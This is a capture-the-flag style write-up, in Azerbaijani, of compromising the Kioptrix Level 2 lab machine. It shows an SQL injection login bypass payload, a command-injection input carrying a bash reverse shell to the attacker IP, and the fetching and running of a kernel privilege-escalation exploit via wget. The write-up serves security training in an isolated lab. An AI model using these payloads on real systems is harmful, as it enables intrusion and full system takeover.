# Kioptrix: Level 2 — Pentest Write-up

**Hədəf:** Kioptrix Level 2 (VulnHub)
**Hədəf IP:** 192.168.65.130
**Attacker IP:** 192.168.65.131 (Kali Linux)
**Çətinlik:** Başlanğıc–Orta (Beginner–Intermediate)

---

## Giriş

Bu yazı Kioptrix seriyasının ikinci maşınının (Level 2) necə tam kompromis edildiyini addım-addım izah edir. Birinci səviyyədən fərqli olaraq burada istismar nöqtəsi birbaşa şəbəkə servisi deyil, **veb tətbiq zəiflikləri** (SQL Injection və Command Injection) oldu. Prosesi klassik metodologiyaya uyğun bölmüşəm: **Recon → Web App Exploitation → Initial Access → Enumeration → Privilege Escalation**.

> ⚠️ **Qeyd:** Bütün addımlar yalnız icazəli, izolə edilmiş lab mühitində (VulnHub-dan endirilmiş qəsdən zəif buraxılmış maşında) icra olunub.

---

## 1. Host Discovery

```bash
arp-scan -l
```
<img width="953" height="485" alt="image" src="https://github.com/user-attachments/assets/4376e087-13a4-43ba-9582-33fbce6e9856" />


Şəbəkədə `192.168.65.130` hədəf maşın kimi müəyyən edildi.

---

## 2. Nmap ilə Enumeration

```bash
nmap -sC -sV 192.168.65.130
```
<img width="957" height="826" alt="image" src="https://github.com/user-attachments/assets/c17f9314-1bb7-4d69-8ac6-98a87cc73cc8" />
<img width="961" height="447" alt="image" src="https://github.com/user-attachments/assets/48be0f56-56c0-4aa6-8a0d-2677dcd9487a" />


Aşkar olunan əsas portlar:

| Port | Servis | Versiya |
|------|--------|---------|
| 22/tcp | SSH | OpenSSH 3.9p1 (protocol 1.99) |
| 80/tcp | HTTP | Apache 2.0.52 (CentOS) |
| 111/tcp | RPC | rpcbind |
| 443/tcp | HTTPS | Apache 2.0.52 (CentOS), SSLv2 dəstəyi |
| 631/tcp | IPP | CUPS 1.1 |
| 3306/tcp | MySQL | MySQL (unauthorized) |

80/tcp portundakı HTTP servisi ən perspektivli hədəf kimi qiymətləndirildi, çünki arxa planda bir veb tətbiq (giriş paneli) işləyirdi.

---

## 3. Web Enumeration — Login Paneli

Brauzerdə `http://192.168.65.130` ünvanına daxil olduqda bir autentifikasiya forması aşkar edildi:



**"Remote System Administration Login"** başlıqlı sadə HTML form (Username / Password). Form-un backend-i PHP ilə yazılmış və MySQL-ə qoşulmuşdu (nmap-da gördüyümüz 3306 portu ilə uyğunluq təşkil edir).

---

## 4. SQL Injection ilə Autentifikasiya Bypass

Login formunun input sanitizasiyasının olub-olmadığını yoxlamaq üçün klassik SQLi payload-ı sınadım:

**Username:** `admin' or 1=1 -- -`
**Password:** (boş)

<img width="907" height="435" alt="image" src="https://github.com/user-attachments/assets/c0d45238-c234-4527-8f6b-0604f42e0fd5" />


Bu payload backend-dəki SQL sorğusunu məntiqi olaraq həmişə `TRUE` qaytaracaq şəkildə dəyişdirir, yəni sorğu belə bir formaya düşür:

```sql
SELECT * FROM users WHERE username = 'admin' or 1=1 -- -' AND password = '...'
```
<img width="915" height="403" alt="image" src="https://github.com/user-attachments/assets/556b713d-1c9c-4bcc-9ce3-2e0fe3517cb0" />

`-- -` hissəsi qalan sorğunu şərh (comment) halına salır və parol yoxlanışı tamamilə ləğv olunur. Nəticədə autentifikasiyadan **tam bypass** əldə edildi:



Giriş uğurlu oldu və **"Welcome to the Basic Administrative Web Console"** səhifəsinə yönləndirildim — burada şəbəkədə bir maşını ping etmək üçün input sahəsi var idi.
<img width="907" height="285" alt="image" src="https://github.com/user-attachments/assets/77cb16a0-2efa-4d7f-9deb-4ddc240723f1" />

---

## 5. Command Injection → Reverse Shell

Ping funksiyasının arxasında server tərəfdə təhlükəsiz olmayan şəkildə sistem komandası icra edildiyi ehtimal edilirdi (klassik `system("ping " . $_POST['ip'])` nümunəsi). Bunu test etmək üçün komanda ayırıcısı (`;`) ilə əlavə bash reverse shell payload-ı daxil etdim:

```
192.168.65.130;bash -i >& /dev/tcp/192.168.65.131/4444 0>&1
```

<img width="671" height="160" alt="image" src="https://github.com/user-attachments/assets/f08f67fd-1976-48d4-93c4-3df7f2574cb6" />


Əvvəlcə attacker maşınında listener aktivləşdirdim:

```bash
nc -lvnp 4444
```
<img width="607" height="250" alt="image" src="https://github.com/user-attachments/assets/bc1192fb-8ade-4bf6-84c6-1ecccec54366" />


Payload göndərildikdən sonra server-dən reverse shell bağlantısı alındı:



```
connect to [192.168.65.131] from (UNKNOWN) [192.168.65.130] 32769
bash-3.00$ whoami
apache
bash-3.00$ pwd
/var/www/html
```

Bu mərhələdə `apache` istifadəçisi adı altında low-privilege shell əldə edildi.

---

## 6. Post-Exploitation Enumeration

Sistem haqqında məlumat toplamaq üçün:

```bash
uname -a
lsb_release -a
```
<img width="816" height="477" alt="image" src="https://github.com/user-attachments/assets/9f4d6265-70d0-4b1f-8deb-aeccb8ba45ec" />



```
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
Distributor ID: CentOS
Release: 4.5
```

Kernel versiyası (2.6.9-55.EL) və CentOS 4.5 — bu kombinasiya privilege escalation üçün bilinən kernel exploit-lərinə açıq olan köhnə bir mühitə işarə edir.

---

## 7. Privilege Escalation — Kernel Exploit

CentOS 4.5 üçün local privilege escalation exploit-lərini axtardım:

```bash
searchsploit CentOS 4.5
```



Nəticələr arasında **"Linux Kernel 2.6 < 2.6.19 — 'ip_append_data()' Ring0 Privilege Escalation" (CVE-2009-2698)** hədəf kernel versiyasına (2.6.9) tam uyğun gəldi. Exploit-i lokal qovluğa köçürüb mini HTTP server ilə yaydım:

```bash
searchsploit -m 9542.c
python3 -m http.server 8000
```
<img width="957" height="581" alt="image" src="https://github.com/user-attachments/assets/010558c1-219e-43e0-bbc7-9a7248cbcffa" />

Qurban maşının shell-indən exploit faylını `wget` ilə endirdim:

```bash
wget http://192.168.65.131:8000/9542.c
```

<img width="652" height="238" alt="image" src="https://github.com/user-attachments/assets/a8c1cd1d-12fc-4432-bf37-fc57980aeb83" />


Sonra hədəf üzərində kompilyasiya edib icra etdim:

```bash
gcc 9542.c -o root
./root
whoami
```



```
sh-3.00# whoami
root
```
<img width="425" height="208" alt="image" src="https://github.com/user-attachments/assets/ebf0bd0e-1262-420f-9b12-c5c5a57b818d" />

🎯 **Nəticə: root səlahiyyəti ilə tam sistem kompromisi əldə edildi.**

---
